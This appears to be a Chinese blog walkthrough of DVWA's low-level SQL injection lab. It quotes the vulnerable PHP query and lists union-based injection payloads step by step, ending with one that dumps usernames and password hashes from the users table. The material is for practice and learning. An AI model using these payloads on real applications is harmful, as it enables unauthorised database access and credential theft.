---
title: dvwa--SQL注入(low)
tags:
  - DVWA
categories:
  - 学习
  - web安全
  - DVWA
abbrlink: cb7e67e1
date: 2022-04-21 09:14:11
---

# dvwa--SQL注入（low）

## 概念

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 

## 过程

low级代码分析

```php
 $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

未对输入进行过滤，我们输入的内容会传给`$id`，因此可以考虑在输入上做文章



**我们可以通过以下步骤判断这里是否存在注入点**

① 输入1 提交

![1](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png)

②输入1' 提交

![2](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png)

③输入1 and 1=1 提交

![3](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png)

④输入1 and 1=2提交

![4](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png)



**猜解 SQL 查询语句中的字段数, **

①1' order by 1#

![5](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png)

②1' order by 2#

![6](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png)

③1' order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2

![7](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png)

④确定显示的位置 (SQL 语句查询之后的回显位置)

1' union select 1,2# #从下图可以看出有 2 个回显

![8](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png)



**查询当前的数据库, 以及版本**

1' union select version(),database()#

![9](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png)

获取数据库中的表,

1' union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#

![10](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png)

获取表中的字段名,

1'union select 1, group_concat(column_name) from information_schema.columns where table_name='users'#

![11](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png)

获得字段中的数据,

1' union select user, password from users#

![12](https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png)
